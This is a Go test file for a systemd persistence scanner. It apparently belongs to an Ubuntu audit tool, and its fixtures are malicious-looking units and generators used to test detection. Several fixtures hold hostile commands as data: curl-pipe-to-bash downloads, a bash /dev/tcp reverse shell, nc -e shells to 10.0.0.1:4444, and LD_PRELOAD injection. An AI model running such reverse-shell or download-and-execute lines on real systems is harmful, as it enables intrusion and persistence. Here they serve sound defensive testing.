package checks

import (
	"context"
	"os"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"syscall"
	"testing"

	"ubuntu-sys-audit/internal/dpkg"
	"ubuntu-sys-audit/internal/model"
)

// fakeHost is a directory tree standing in for /, so paths such as /tmp/x keep
// their meaning while nothing on the machine running the test is touched.
type fakeHost struct {
	t     *testing.T
	root  string
	owned map[string]bool
	users []User
}

func newFakeHost(t *testing.T) *fakeHost {
	t.Helper()
	root, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	return &fakeHost{t: t, root: root, owned: map[string]bool{}}
}

func (h *fakeHost) write(path, content string) {
	h.t.Helper()
	if err := os.MkdirAll(filepath.Dir(h.root+path), 0o755); err != nil {
		h.t.Fatal(err)
	}
	if err := os.WriteFile(h.root+path, []byte(content), 0o755); err != nil {
		h.t.Fatal(err)
	}
}

// ownedFile writes a file that a package provides.
func (h *fakeHost) ownedFile(path, content string) {
	h.t.Helper()
	h.write(path, content)
	h.own(path)
}

func (h *fakeHost) own(paths ...string) {
	for _, p := range paths {
		h.owned[dpkg.NormalizePath(p)] = true
	}
}

// link makes path a symlink. A target inside the tree is written relative, which
// resolves inside it the way an absolute link would on the host.
func (h *fakeHost) link(path, target string) {
	h.t.Helper()
	if err := os.MkdirAll(filepath.Dir(h.root+path), 0o755); err != nil {
		h.t.Fatal(err)
	}
	rel, err := filepath.Rel(filepath.Dir(path), target)
	if err != nil {
		h.t.Fatal(err)
	}
	if err := os.Symlink(rel, h.root+path); err != nil {
		h.t.Fatal(err)
	}
}

func (h *fakeHost) addUser(name, home string) User {
	h.t.Helper()
	if err := os.MkdirAll(h.root+home, 0o755); err != nil {
		h.t.Fatal(err)
	}
	u := User{Name: name, UID: 1000 + len(h.users), Home: home}
	h.users = append(h.users, u)
	return u
}

func (h *fakeHost) scan() []model.Finding {
	owned := func(p string) bool { return h.owned[dpkg.NormalizePath(p)] }
	s := newSystemdScan(context.Background(), owned, h.users, h.users)
	s.root = h.root
	return s.run()
}

func findingByID(found []model.Finding, id string) *model.Finding {
	for i := range found {
		if found[i].ID == id {
			return &found[i]
		}
	}
	return nil
}

// wantFinding checks a finding's severity and that each text is in its evidence.
func wantFinding(t *testing.T, found []model.Finding, id string, sev model.Severity, texts ...string) {
	t.Helper()
	f := findingByID(found, id)
	if f == nil {
		t.Errorf("no %s in %v", id, ids(found))
		return
	}
	if f.Severity != sev {
		t.Errorf("%s severity: got %v, want %v", id, f.Severity, sev)
	}
	joined := strings.Join(f.Evidence, "\n")
	for _, text := range texts {
		if !strings.Contains(joined, text) {
			t.Errorf("%s lacks %q:\n%s", id, text, joined)
		}
	}
}

func wantNoFinding(t *testing.T, found []model.Finding, id string) {
	t.Helper()
	if f := findingByID(found, id); f != nil {
		t.Errorf("unexpected %s: %v", id, f.Evidence)
	}
}

func ids(found []model.Finding) []string {
	out := make([]string, len(found))
	for i, f := range found {
		out[i] = f.ID
	}
	return out
}

func allText(found []model.Finding) string {
	var b strings.Builder
	for _, f := range found {
		b.WriteString(f.Title + "\n" + f.Detail + "\n" + strings.Join(f.Evidence, "\n") + "\n")
	}
	return b.String()
}

func TestLogicalLines(t *testing.T) {
	cases := []struct {
		name, src string
		want      []string
	}{
		{"plain", "A=1\nB=2\n", []string{"A=1", "B=2", ""}},
		{"continuation", "A=one \\\n   two \\\n three\nB=2", []string{"A=one  two  three", "B=2"}},
		{"comment inside a continuation is skipped, not the end", "A=one \\\n# note\n; note\ntwo\nB=2", []string{"A=one  two", "B=2"}},
		{"escaped backslash does not continue", "A=one\\\\\nB=2", []string{`A=one\\`, "B=2"}},
		{"odd run of backslashes continues", "A=one\\\\\\\ntwo", []string{`A=one\\ two`}},
		{"backslash before a space does not continue", "A=one\\ \nB=2", []string{`A=one\`, "B=2"}},
		{"continuation at the end of the file", "A=one \\", []string{"A=one"}},
		{"CRLF", "A=one \\\r\ntwo\r\nB=2", []string{"A=one  two", "B=2"}},
		{"a bare CR ends a comment", "# note\rExecStart=/tmp/x", []string{"ExecStart=/tmp/x"}},
		{"NUL ends a comment", "# note\x00ExecStart=/tmp/x", []string{"ExecStart=/tmp/x"}},
		{"comment lines", "# a\n; b\n  # c\nA=1", []string{"A=1"}},
	}
	for _, c := range cases {
		if got := logicalLines(c.src); !reflect.DeepEqual(got, c.want) {
			t.Errorf("%s: got %q, want %q", c.name, got, c.want)
		}
	}
}

func TestParseUnit(t *testing.T) {
	src := strings.Join([]string{
		"[Service]",
		"ExecStart=",
		"ExecStart=-/usr/bin/a one",
		"ExecCondition=/usr/bin/b",
		"ExecStopPre = !!/usr/bin/c",
		"ExecStartPost=|/usr/bin/d \\",
		"  two",
		"# ExecStop=/usr/bin/commented",
		`Environment="A=1" B=2`,
		"Environment=",
		"EnvironmentFile=-/etc/default/x",
		"EnvironmentFile=",
		"NotExecStart=/usr/bin/z",
	}, "\n")
	u := parseUnit(src)
	var got []string
	for _, e := range u.execs {
		got = append(got, e.key+" "+e.cmd)
	}
	want := []string{"ExecStart /usr/bin/a one", "ExecCondition /usr/bin/b", "ExecStopPre /usr/bin/c", "ExecStartPost /usr/bin/d  two"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("execs: got %q, want %q", got, want)
	}
	if !reflect.DeepEqual(u.environment, []string{`"A=1" B=2`}) {
		t.Errorf("environment: %q", u.environment)
	}
	if !reflect.DeepEqual(u.envFiles, []string{"-/etc/default/x"}) {
		t.Errorf("env files: %q", u.envFiles)
	}
}

func TestParseExecValue(t *testing.T) {
	cases := []struct {
		name, value string
		want        [][]string
	}{
		{"prefix", "-/usr/bin/a b", [][]string{{"/usr/bin/a", "b"}}},
		{"several prefixes", "+-/usr/bin/a", [][]string{{"/usr/bin/a"}}},
		{"quoted program", `"/tmp/a b" c`, [][]string{{"/tmp/a b", "c"}}},
		{"prefix before quotes", `-"/tmp/a"`, [][]string{{"/tmp/a"}}},
		{"separate argv[0]", `@/bin/sleep "/bin/sleep" "60"`, [][]string{{"/bin/sleep", "60"}}},
		{"semicolon separates", "/bin/a ; -/tmp/b c", [][]string{{"/bin/a"}, {"/tmp/b", "c"}}},
		{"escaped semicolon is an argument", `/bin/find . -exec x \;`, [][]string{{"/bin/find", ".", "-exec", "x", ";"}}},
		{"quoted semicolon is an argument", `/bin/a ";"`, [][]string{{"/bin/a", ";"}}},
		{"hex escape", `/\x74mp/a`, [][]string{{"/tmp/a"}}},
		{"octal escape", `/\164mp/a`, [][]string{{"/tmp/a"}}},
		{"unicode escape", `/\u0074mp/a`, [][]string{{"/tmp/a"}}},
		{"escaped space", `/tmp/a\sb`, [][]string{{"/tmp/a b"}}},
		{"unterminated quote", `/bin/a "b c`, [][]string{{"/bin/a", "b c"}}},
		{"only a prefix", "-", nil},
	}
	for _, c := range cases {
		var got [][]string
		for _, cmd := range parseExecValue(c.value) {
			got = append(got, cmd.words)
		}
		if !reflect.DeepEqual(got, c.want) {
			t.Errorf("%s: got %q, want %q", c.name, got, c.want)
		}
	}
}

func TestExecTargets(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		want []string
	}{
		{"plain", "/usr/bin/a --pidfile /tmp/a.pid", []string{"/usr/bin/a"}},
		{"env", "/usr/bin/env -i A=/x /tmp/a b", []string{"/usr/bin/env", "/tmp/a"}},
		{"sudo takes a value", "/usr/bin/sudo -u bob /tmp/a", []string{"/usr/bin/sudo", "/tmp/a"}},
		{"nice number", "/usr/bin/nice -n 10 /tmp/a", []string{"/usr/bin/nice", "/tmp/a"}},
		{"timeout duration", "/usr/bin/timeout 30s /tmp/a", []string{"/usr/bin/timeout", "/tmp/a"}},
		{"timeout argument is not a program", "/usr/bin/timeout 30 foo /tmp/a", []string{"/usr/bin/timeout", "foo"}},
		{"a lock file is not a program", "/usr/bin/flock /tmp/a.lock /usr/bin/b", []string{"/usr/bin/flock"}},
		{"script", "/bin/bash -x /tmp/a.sh arg", []string{"/bin/bash", "/tmp/a.sh"}},
		{"python script", "/usr/bin/python3 /tmp/a.py", []string{"/usr/bin/python3", "/tmp/a.py"}},
		{"script argument is not a program", "/bin/sh run.sh /tmp/a", []string{"/bin/sh", "run.sh"}},
		{"nested wrappers", "/usr/bin/env nohup /tmp/a", []string{"/usr/bin/env", "nohup", "/tmp/a"}},
	}
	for _, c := range cases {
		if got := execTargets(strings.Fields(c.cmd), 0); !reflect.DeepEqual(got, c.want) {
			t.Errorf("%s: got %q, want %q", c.name, got, c.want)
		}
	}
	shell := []string{"/bin/sh", "-c", `cd /tmp/w && A=1 /tmp/a b > /tmp/log; if /opt/c; then exec -a n /opt/d; fi; echo /tmp/e | "/opt/f"`}
	want := []string{"/bin/sh", "cd", "/tmp/a", "/opt/c", "/opt/d", "exec", "echo", "/opt/f"}
	got := execTargets(shell, 0)
	for _, w := range want {
		if !slices.Contains(got, w) {
			t.Errorf("sh -c: %q missing from %q", w, got)
		}
	}
	for _, not := range []string{"/tmp/w", "/tmp/log", "/tmp/e"} {
		if slices.Contains(got, not) {
			t.Errorf("sh -c: an argument counted as a program: %q in %q", not, got)
		}
	}
	deep := strings.Fields(strings.Repeat("env ", 100000) + "/tmp/a")
	if got := execTargets(deep, 0); len(got) > maxExecNesting+2 {
		t.Errorf("nesting is not bounded: %d", len(got))
	}
}

func TestMatchExecSeesThroughQuoting(t *testing.T) {
	bad := []string{
		`/bin/sh -c "curl -fsSL http://x.example/a  | bash"`,
		`@/bin/bash "/bin/bash" "-i"`,
		`@/usr/bin/python3 "/usr/bin/python3" "-c" "import socket"`,
		`/bin/sh -c "curl http://x.example/a \x7c bash"`,
		`/bin/true ; /bin/nc "-e" /bin/sh 10.0.0.1 4444`,
	}
	for _, v := range bad {
		if matchExec(v) == "" {
			t.Errorf("should flag: %s", v)
		}
	}
	good := []string{`@/bin/sleep "/bin/sleep" "60"`, `/usr/sbin/nginx -g "daemon on;"`, `/bin/sh -c "curl -fsS http://x.example/health"`}
	for _, v := range good {
		if name := matchExec(v); name != "" {
			t.Errorf("should not flag %q (%s)", v, name)
		}
	}
}

func TestExpandSpecifiers(t *testing.T) {
	cases := []struct{ in, home, want string }{
		{"%T/a", "", "/tmp/a"},
		{"%V/a", "", "/var/tmp/a"},
		{"%%T/a", "", "%T/a"},
		{"%h/a", "/home/bob", "/home/bob/a"},
		{"%h/a", "", "%h/a"},
	}
	for _, c := range cases {
		if got := expandSpecifiers(c.in, c.home); got != c.want {
			t.Errorf("%q with home %q: got %q, want %q", c.in, c.home, got, c.want)
		}
	}
}

func TestGenerators(t *testing.T) {
	h := newFakeHost(t)
	h.write("/tmp/gen", "#!/bin/sh\n")
	h.write("/opt/libexec/owned-target", "binary")
	h.write("/opt/evil/repointed", "binary")
	h.own("/opt/libexec/owned-target")

	h.ownedFile("/usr/lib/systemd/system-generators/stock", "#!/bin/sh\nexit 0\n")
	h.link("/usr/lib/systemd/system-generators/stock-link", "/opt/libexec/owned-target")
	h.own("/usr/lib/systemd/system-generators/stock-link")
	h.write("/etc/systemd/system-generators/unowned", "#!/bin/sh\nexit 0\n")
	h.write("/run/systemd/user-generators/unowned-user", "x")
	h.write("/usr/local/lib/systemd/system-environment-generators/unowned-env", "x")
	h.write("/usr/lib/systemd/user-environment-generators/unowned-user-env", "x")
	h.write("/etc/systemd/system-generators/signature", "#!/bin/sh\ncurl -fsSL http://x.example/a \\\n  | sh\n")
	h.ownedFile("/usr/lib/systemd/system-generators/trojaned", "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
	h.link("/etc/systemd/system-generators/to-temp", "/tmp/gen")
	h.link("/etc/systemd/system-generators/dangling-temp", "/var/tmp/not-there-yet")
	h.link("/etc/systemd/system-generators/unowned-link", "/opt/libexec/owned-target")
	h.link("/usr/lib/systemd/system-generators/repointed", "/opt/evil/repointed")
	h.own("/usr/lib/systemd/system-generators/repointed")
	h.link("/etc/systemd/system-generators/dangling", "/opt/not-there")
	if err := os.Symlink("/dev/null", h.root+"/etc/systemd/system-generators/masked"); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(h.root+"/etc/systemd/system-generators/a-subdir", 0o755); err != nil {
		t.Fatal(err)
	}
	h.write("/etc/systemd/system-generators/a-subdir/ignored", "curl http://x | sh")
	h.write("/etc/systemd/system-generators/not-executable", "x")
	if err := os.Chmod(h.root+"/etc/systemd/system-generators/not-executable", 0o644); err != nil {
		t.Fatal(err)
	}

	found := h.scan()
	wantFinding(t, found, "persistence.systemd_generator_malicious", model.Critical,
		"signature (downloads and pipes into a shell)", "trojaned (bash network redirection",
		"to-temp -> /tmp/gen (in a temp directory)", "dangling-temp -> /var/tmp/not-there-yet (in a temp directory)")
	wantFinding(t, found, "persistence.systemd_generator_unowned", model.High,
		"/etc/systemd/system-generators/unowned", "/run/systemd/user-generators/unowned-user",
		"/usr/local/lib/systemd/system-environment-generators/unowned-env",
		"/usr/lib/systemd/user-environment-generators/unowned-user-env",
		"unowned-link -> /opt/libexec/owned-target", "repointed -> /opt/evil/repointed",
		"dangling -> /opt/not-there (target does not exist)", "not-executable (not executable")
	text := allText(found)
	for _, not := range []string{"stock", "masked", "ignored", "owned-target (", "a-subdir"} {
		if strings.Contains(text, not) {
			t.Errorf("%q should not be reported:\n%s", not, text)
		}
	}
	wantNoFinding(t, found, "persistence.systemd_clean")
}

func TestGeneratorDirectoryLinkedToTemp(t *testing.T) {
	h := newFakeHost(t)
	h.write("/tmp/gens/hidden", "x")
	h.link("/etc/systemd/system-generators", "/tmp/gens")
	wantFinding(t, h.scan(), "persistence.systemd_generator_malicious", model.Critical, "/tmp/gens/hidden (in a temp directory)")
}

func TestGeneratorsSeenOnceOnMergedUsr(t *testing.T) {
	h := newFakeHost(t)
	h.write("/usr/lib/systemd/system-generators/unowned", "x")
	h.write("/usr/lib/systemd/system/a.service", "[Service]\nExecStart=/opt/a\n")
	h.link("/lib", "/usr/lib")
	found := h.scan()
	wantFinding(t, found, "persistence.systemd_generator_unowned", model.High)
	if f := findingByID(found, "persistence.systemd_generator_unowned"); f != nil && len(f.Evidence) != 1 {
		t.Errorf("generator listed more than once: %v", f.Evidence)
	}
	if f := findingByID(found, "persistence.systemd_unowned"); f == nil || len(f.Evidence) != 1 {
		t.Errorf("unit listed more than once: %+v", f)
	}
}

func TestXDGUserDirLinkIsWalked(t *testing.T) {
	h := newFakeHost(t)
	h.write("/opt/xdg/evil.service", "[Service]\nExecStart=/opt/evil\n")
	h.link("/etc/xdg/systemd/user", "/opt/xdg")
	wantFinding(t, h.scan(), "persistence.systemd_unowned", model.Info, "/opt/xdg/evil.service -> /opt/evil")
}

func TestGeneratedUnitsAreExecOnly(t *testing.T) {
	h := newFakeHost(t)
	h.write("/run/systemd/generator/plain.service", "[Service]\nExecStart=/opt/plain\nEnvironment=LD_PRELOAD=/opt/x.so\n")
	h.write("/run/systemd/generator.early/temp.service", "[Service]\nExecStart=/tmp/a\n")
	h.write("/run/systemd/generator.late/bad.service", "[Service]\nExecStart=/bin/sh -c 'curl -s http://x.example | sh'\n")
	found := h.scan()
	wantFinding(t, found, "persistence.systemd_temp", model.Critical, "generator.early/temp.service: /tmp/a")
	wantFinding(t, found, "persistence.systemd_malicious", model.Critical, "generator.late/bad.service")
	wantNoFinding(t, found, "persistence.systemd_unowned")
	wantNoFinding(t, found, "persistence.systemd_env_inject")
}

func TestTransientUnits(t *testing.T) {
	h := newFakeHost(t)
	h.write("/run/systemd/transient/run-u1.service", "[Service]\nExecStart=\nExecStart=@/bin/sleep \"/bin/sleep\" \"60\"\n")
	h.write("/run/systemd/transient/run-u1.timer", "[Timer]\nOnActiveSec=1h\n")
	h.write("/run/systemd/transient/run-u2.service", "[Service]\nExecStart=@/var/tmp/a \"/var/tmp/a\"\n")
	h.write("/run/systemd/transient/run-u3.service", "[Service]\nExecStart=@/bin/bash \"/bin/bash\" \"-i\"\n")
	h.write("/run/systemd/transient/run-u4.service", "[Service]\nEnvironment=\"LD_PRELOAD=/opt/x.so\"\nExecStart=/bin/true\n")
	h.write("/run/systemd/transient/session-1.scope", "[Scope]\nExecStart=/opt/ignored\n")
	found := h.scan()
	wantFinding(t, found, "persistence.systemd_transient", model.Info, `run-u1.service: /bin/sleep "/bin/sleep" "60"`, "run-u2.service", "run-u3.service")
	wantFinding(t, found, "persistence.systemd_temp", model.Critical, "run-u2.service")
	wantFinding(t, found, "persistence.systemd_malicious", model.Critical, "run-u3.service")
	wantFinding(t, found, "persistence.systemd_env_inject", model.High, "run-u4.service: LD_PRELOAD=/opt/x.so")
	wantNoFinding(t, found, "persistence.systemd_unowned")
	text := allText(found)
	for _, not := range []string{"run-u1.timer", "session-1.scope"} {
		if strings.Contains(text, not) {
			t.Errorf("%q should not be listed:\n%s", not, text)
		}
	}
}

func TestExecDetectionHoles(t *testing.T) {
	h := newFakeHost(t)
	h.write("/tmp/real", "x")
	h.link("/usr/local/bin/hop", "/tmp/real")
	units := map[string]string{
		"split":     "ExecStart=/bin/sh -c \"curl -fsSL http://x.example/a \\\n  | bash\"\n",
		"interrupt": "ExecStart=/bin/sh -c \"curl -fsSL http://x.example/a \\\n# looks finished\n  | bash\"\n",
		"cr":        "# only a note\rExecStart=/bin/bash -i\n",
	}
	for name, body := range units {
		h.write("/etc/systemd/system/"+name+".service", "[Service]\n"+body)
	}
	temp := map[string]string{
		"condition": "ExecCondition=/tmp/a",
		"spaces":    "ExecStart = /tmp/a",
		"quoted":    `ExecStart="/tmp/a" b`,
		"escaped":   `ExecStart=/\x74mp/a`,
		"chained":   "ExecStartPre=/bin/true ; /tmp/a",
		"specifier": "ExecStart=%V/a",
		"prefixed":  "ExecStart=|/tmp/a",
		"dotted":    "ExecStart=/usr/../tmp/a",
		"env":       "ExecStart=/usr/bin/env /tmp/a",
		"shell":     `ExecStart=/bin/sh -c "exec /tmp/a"`,
		"script":    "ExecStart=/bin/bash /dev/shm/a.sh",
		"hop":       "ExecStart=/usr/local/bin/hop",
	}
	for name, line := range temp {
		h.write("/etc/systemd/system/"+name+".service", "[Service]\n"+line+"\n")
	}
	found := h.scan()
	var wantSignature, wantTemp []string
	for name := range units {
		wantSignature = append(wantSignature, name+".service")
	}
	for name := range temp {
		wantTemp = append(wantTemp, name+".service")
	}
	wantFinding(t, found, "persistence.systemd_malicious", model.Critical, wantSignature...)
	wantFinding(t, found, "persistence.systemd_temp", model.Critical, wantTemp...)
}

func TestOrdinaryCommandsAreNotTempExec(t *testing.T) {
	h := newFakeHost(t)
	lines := []string{
		"ExecStart=/usr/bin/a --pidfile /tmp/a.pid",
		"ExecStartPre=/bin/mkdir -p /tmp/a",
		`ExecStartPre=/bin/sh -c "rm -f /tmp/a; touch /tmp/b > /tmp/c"`,
		"ExecStart=/usr/bin/flock /tmp/a.lock /usr/bin/a",
		"ExecStart=/usr/bin/env TMPDIR=/tmp/a /usr/bin/a",
		"ExecStart=/bin/sh run.sh /tmp/a",
	}
	for i, line := range lines {
		h.write("/etc/systemd/system/u"+string(rune('a'+i))+".service", "[Service]\n"+line+"\n")
	}
	found := h.scan()
	if f := findingByID(found, "persistence.systemd_temp"); f != nil {
		t.Errorf("false alarm: %v", f.Evidence)
	}
	wantFinding(t, found, "persistence.systemd_clean", model.OK)
}

func TestUnitLinks(t *testing.T) {
	h := newFakeHost(t)
	h.write("/var/tmp/p/linked.service", "[Service]\nExecStart=/opt/a\n")
	h.link("/etc/systemd/system/linked.service", "/var/tmp/p/linked.service")
	h.link("/etc/systemd/system/gone.service", "/tmp/not-there-yet")
	h.write("/opt/app/outside.service", "[Service]\nExecStart=/opt/outside\n")
	h.link("/etc/systemd/system/outside.service", "/opt/app/outside.service")
	h.write("/usr/lib/systemd/system/real.service", "[Service]\nExecStart=/opt/real\n")
	h.link("/etc/systemd/system/multi-user.target.wants/real.service", "/usr/lib/systemd/system/real.service")
	found := h.scan()
	wantFinding(t, found, "persistence.systemd_temp", model.Critical, "linked.service is a unit file in a temp directory", "gone.service is a unit file in a temp directory: /tmp/not-there-yet")
	f := findingByID(found, "persistence.systemd_unowned")
	if f == nil {
		t.Fatal("no systemd_unowned")
	}
	joined := strings.Join(f.Evidence, "\n")
	if !strings.Contains(joined, "/opt/app/outside.service -> /opt/outside") {
		t.Errorf("a link out of the unit directories was not read: %s", joined)
	}
	if strings.Count(joined, "real.service") != 1 {
		t.Errorf("an enablement link was scanned again: %s", joined)
	}
}

func TestUnitDirectoryLinkedToTemp(t *testing.T) {
	h := newFakeHost(t)
	h.write("/tmp/units/x.service", "[Service]\nExecStart=/opt/x\n")
	h.link("/etc/xdg/systemd/user", "/tmp/units")
	wantFinding(t, h.scan(), "persistence.systemd_temp", model.Critical, "/etc/xdg/systemd/user is a unit directory linked to a temp directory: /tmp/units")
}

func TestLingering(t *testing.T) {
	h := newFakeHost(t)
	h.addUser("bob", "/home/bob")
	h.addUser("carol", "/home/carol")
	h.addUser("dave", "/home/dave")
	h.write("/var/lib/systemd/linger/bob", "")
	h.write("/var/lib/systemd/linger/dave", "")
	h.write("/var/lib/systemd/linger/ghost", "")
	h.write("/home/bob/.config/systemd/user/job.service", "[Service]\nExecStart=/home/bob/bin/job\n")
	h.write("/home/bob/.config/systemd/user/job.timer", "[Timer]\nOnBootSec=1\n")
	h.write("/home/bob/.local/share/systemd/user/other.service", "[Service]\nExecStart=/home/bob/bin/other\n")
	h.write("/home/carol/.config/systemd/user/notlinger.service", "[Service]\nExecStart=/home/carol/bin/x\n")
	found := h.scan()
	wantFinding(t, found, "persistence.systemd_linger", model.Info, "bob (uid 1000, home /home/bob)", "dave (uid", "ghost (no such account)")
	wantFinding(t, found, "persistence.systemd_linger_units", model.Medium,
		"bob: /home/bob/.config/systemd/user/job.service -> /home/bob/bin/job",
		"bob: /home/bob/.config/systemd/user/job.timer",
		"bob: /home/bob/.local/share/systemd/user/other.service -> /home/bob/bin/other")
	f := findingByID(found, "persistence.systemd_linger_units")
	if f != nil && strings.Contains(strings.Join(f.Evidence, "\n"), "carol") {
		t.Errorf("a user without lingering was listed: %v", f.Evidence)
	}
	wantFinding(t, found, "persistence.systemd_unowned", model.Info, "/home/carol/.config/systemd/user/notlinger.service")
}

func TestUserUnitDirectories(t *testing.T) {
	for _, dir := range []string{"/etc/xdg/systemd/user", "/usr/local/lib/systemd/user", "/run/systemd/user"} {
		h := newFakeHost(t)
		h.write(dir+"/evil.service", "[Service]\nExecStart=/tmp/a\n")
		wantFinding(t, h.scan(), "persistence.systemd_temp", model.Critical, dir+"/evil.service")
	}
	h := newFakeHost(t)
	h.addUser("bob", "/home/bob")
	h.write("/home/bob/.local/share/systemd/user/evil.service", "[Service]\nExecStart=/tmp/a\n")
	wantFinding(t, h.scan(), "persistence.systemd_temp", model.Critical, "/home/bob/.local/share/systemd/user/evil.service")
}

func TestHomeLinksAreNeverRead(t *testing.T) {
	const secret = "S3CRET-IN-TARGET"
	unit := "[Service]\nExecStart=/bin/true " + secret + "\nEnvironment=LD_PRELOAD=" + secret + "\n"

	h := newFakeHost(t)
	h.addUser("bob", "/home/bob")
	h.addUser("carol", "/home/carol")
	h.write("/root/secret.service", unit)
	h.write("/home/bob/.config/systemd/user/real.service", "[Service]\nExecStart=/home/bob/bin/real\n")
	h.link("/home/bob/.config/systemd/user/leak.service", "/root/secret.service")
	h.link("/home/bob/.config/systemd/user/temp.service", "/tmp/x.service")
	h.link("/home/bob/.config/systemd/user/default.target.wants/real.service", "/home/bob/.config/systemd/user/real.service")
	h.link("/home/bob/.config/systemd/user/default.target.wants/pkg.service", "/usr/lib/systemd/user/pkg.service")
	// A link above the unit directory, which O_NOFOLLOW on the last part would miss.
	h.write("/root/hidden/share/systemd/user/up.service", unit)
	h.link("/home/bob/.local", "/root/hidden")
	h.write("/root/cfg/systemd/user/up2.service", unit)
	h.link("/home/carol/.config", "/root/cfg")
	found := h.scan()

	if text := allText(found); strings.Contains(text, secret) {
		t.Errorf("read through a symlink:\n%s", text)
	}
	wantFinding(t, found, "persistence.systemd_links", model.Medium,
		"user/leak.service -> /root/secret.service",
		"/home/bob/.local/share/systemd/user -> /root/hidden/share/systemd/user",
		"/home/carol/.config/systemd/user -> /root/cfg/systemd/user")
	wantFinding(t, found, "persistence.systemd_temp", model.Critical, "temp.service is a unit file in a temp directory: /tmp/x.service")
	if f := findingByID(found, "persistence.systemd_links"); f != nil {
		joined := strings.Join(f.Evidence, "\n")
		if strings.Contains(joined, "default.target.wants") {
			t.Errorf("an enablement link was reported: %s", joined)
		}
	}
	if f := findingByID(found, "persistence.systemd_unowned"); f == nil || len(f.Evidence) != 1 || !strings.Contains(f.Evidence[0], "real.service") {
		t.Errorf("the real unit should be listed once: %+v", f)
	}
}

func TestLingeringUserWithLinkedUnit(t *testing.T) {
	h := newFakeHost(t)
	h.addUser("bob", "/home/bob")
	h.write("/var/lib/systemd/linger/bob", "")
	h.write("/opt/x.service", "[Service]\nExecStart=/opt/x\n")
	h.link("/home/bob/.config/systemd/user/x.service", "/opt/x.service")
	h.link("/home/bob/.config/systemd/user/pkg.service", "/usr/lib/systemd/user/pkg.service")
	found := h.scan()
	wantFinding(t, found, "persistence.systemd_linger_units", model.Medium, "bob: /home/bob/.config/systemd/user/x.service -> /opt/x.service")
	if f := findingByID(found, "persistence.systemd_linger_units"); f != nil && len(f.Evidence) != 1 {
		t.Errorf("a link to a system unit should not count: %v", f.Evidence)
	}
}

func TestEnvironmentInjection(t *testing.T) {
	h := newFakeHost(t)
	h.own("/usr/lib/libjemalloc.so.2", "/usr/lib/foo")
	h.write("/usr/lib/libjemalloc.so.2", "x")
	h.write("/usr/lib/foo/lib.so", "x")

	h.write("/etc/systemd/system/a.service", "[Service]\nEnvironment=LD_PRELOAD=/opt/x.so\n")
	h.write("/etc/systemd/system/b.service", "[Service]\nEnvironment=APP_CRED=hunter2 \"LD_LIBRARY_PATH=/opt/lib\" OTHER=1\n")
	h.write("/etc/systemd/system/c.service", "[Service]\nEnvironment=LD_AUDIT=/opt/a.so\n")
	h.write("/etc/systemd/system/d.service.d/x.conf", "[Service]\nEnvironment=LD_PRELOAD=/usr/lib/libjemalloc.so.2\n")
	h.write("/etc/systemd/system/service.d/global.conf", "[Service]\nEnvironment=LD_PRELOAD=/opt/everywhere.so\n")
	// Clearing a variable is the opposite of injecting one.
	h.write("/etc/systemd/system/e.service", "[Service]\nEnvironment=LD_PRELOAD=\nUnsetEnvironment=LD_PRELOAD\nEnvironment=NOT_LD_PRELOAD=/opt/x\n")
	h.ownedFile("/usr/lib/systemd/system/fine.service", "[Service]\nEnvironment=LD_PRELOAD=/usr/lib/libjemalloc.so.2 LD_LIBRARY_PATH=/usr/lib/foo\n")
	h.ownedFile("/usr/lib/systemd/system/mixed.service", "[Service]\nEnvironment=\"LD_PRELOAD=/usr/lib/libjemalloc.so.2:/opt/y.so\"\n")
	h.ownedFile("/usr/lib/systemd/system/cwd.service", "[Service]\nEnvironment=LD_LIBRARY_PATH=/usr/lib/foo:\n")
	h.ownedFile("/usr/lib/systemd/system/bare.service", "[Service]\nEnvironment=LD_PRELOAD=libjemalloc.so.2\n")
	found := h.scan()
	wantFinding(t, found, "persistence.systemd_env_inject", model.High,
		"a.service: LD_PRELOAD=/opt/x.so", "b.service: LD_LIBRARY_PATH=/opt/lib", "c.service: LD_AUDIT=/opt/a.so",
		"d.service.d/x.conf: LD_PRELOAD=/usr/lib/libjemalloc.so.2", "service.d/global.conf",
		"mixed.service", "cwd.service", "bare.service")
	text := allText(found)
	for _, not := range []string{"hunter2", "APP_CRED", "OTHER", "/e.service", "fine.service", "NOT_LD_PRELOAD"} {
		if strings.Contains(text, not) {
			t.Errorf("%q should not be in the report:\n%s", not, text)
		}
	}
}

func TestEnvironmentFiles(t *testing.T) {
	h := newFakeHost(t)
	h.addUser("bob", "/home/bob")
	h.own("/usr/lib/libjemalloc.so.2")
	h.write("/usr/lib/libjemalloc.so.2", "x")
	const envFile = "APP_CRED=hunter2\n# LD_AUDIT=/commented\nLD_PRELOAD=/opt/evil.so\nexport LD_AUDIT=\"/opt/a.so\"\nLD_LIBRARY_PATH =\nNOT_LD_PRELOAD=/opt/x\n"
	h.write("/etc/app.env", envFile)
	h.write("/etc/systemd/system/plain.service", "[Service]\nEnvironmentFile=/etc/app.env\n")
	h.write("/etc/systemd/system/temp.service", "[Service]\nEnvironmentFile=/tmp/a.env\n")
	h.write("/etc/systemd/system/temp2.service", "[Service]\nEnvironmentFile=-%T/b.env\n")
	h.write("/etc/systemd/system/missing.service", "[Service]\nEnvironmentFile=-/etc/not-there.env\n")
	h.write("/etc/glob/one.env", "LD_AUDIT=/opt/glob.so\n")
	h.write("/etc/systemd/system/glob.service", "[Service]\nEnvironmentFile=-/etc/glob/*.env\n")
	h.write("/etc/default/stock", "LD_PRELOAD=/usr/lib/libjemalloc.so.2\n")
	h.ownedFile("/usr/lib/systemd/system/stock.service", "[Service]\nEnvironmentFile=/etc/default/stock\n")
	h.write("/home/bob/app.env", "LD_AUDIT=/opt/home.so\n")
	h.write("/home/bob/.config/systemd/user/h.service", "[Service]\nEnvironmentFile=%h/app.env\n")

	// Must be refused: a link could point at /etc/shadow, a FIFO would hang.
	h.write("/root/secret.env", "LD_PRELOAD=/opt/from-a-secret-file.so\n")
	h.link("/etc/linked.env", "/root/secret.env")
	h.write("/etc/systemd/system/linked.service", "[Service]\nEnvironmentFile=/etc/linked.env\n")
	h.write("/tmp/t.env", "LD_PRELOAD=/opt/t.so\n")
	h.link("/etc/to-temp.env", "/tmp/t.env")
	h.write("/etc/systemd/system/linktemp.service", "[Service]\nEnvironmentFile=/etc/to-temp.env\n")
	h.link("/etc/dangling.env", "/var/tmp/not-there")
